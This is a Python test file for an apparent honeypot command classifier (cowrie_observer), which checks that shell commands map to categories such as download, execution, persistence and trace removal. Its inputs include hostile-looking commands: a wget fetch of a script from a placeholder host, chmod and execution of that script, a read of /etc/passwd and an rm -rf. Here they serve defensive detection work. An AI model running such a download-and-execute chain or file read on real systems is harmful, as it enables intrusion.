from cowrie_observer.commands import CommandCategory, classify_command


def test_classify_system_information_command() -> None:
    assert classify_command("uname -a") is CommandCategory.SYSTEM_INFO


def test_classify_user_check_command() -> None:
    assert classify_command("whoami") is CommandCategory.USER_CHECK


def test_classify_network_check_command() -> None:
    assert classify_command("ifconfig") is CommandCategory.NETWORK_CHECK


def test_classify_process_check_command() -> None:
    assert classify_command("ps aux") is CommandCategory.PROCESS_CHECK


def test_classify_file_operation_command() -> None:
    assert classify_command("cat /etc/passwd") is CommandCategory.FILE_OPERATION


def test_classify_permission_change_command() -> None:
    assert classify_command("chmod +x run.sh") is CommandCategory.PERMISSION_CHANGE


def test_classify_download_command() -> None:
    assert classify_command("wget http://example.invalid/a.sh") is CommandCategory.DOWNLOAD


def test_classify_execution_command() -> None:
    assert classify_command("./run.sh") is CommandCategory.EXECUTION


def test_classify_persistence_attempt_command() -> None:
    assert classify_command("crontab -l") is CommandCategory.PERSISTENCE_ATTEMPT


def test_classify_trace_removal_command() -> None:
    assert classify_command("rm -rf /tmp/x") is CommandCategory.TRACE_REMOVAL


def test_classify_unknown_command() -> None:
    assert classify_command("totally-not-known") is CommandCategory.UNKNOWN


def test_classify_command_does_not_execute_input() -> None:
    assert classify_command("echo should-not-run") is CommandCategory.UNKNOWN
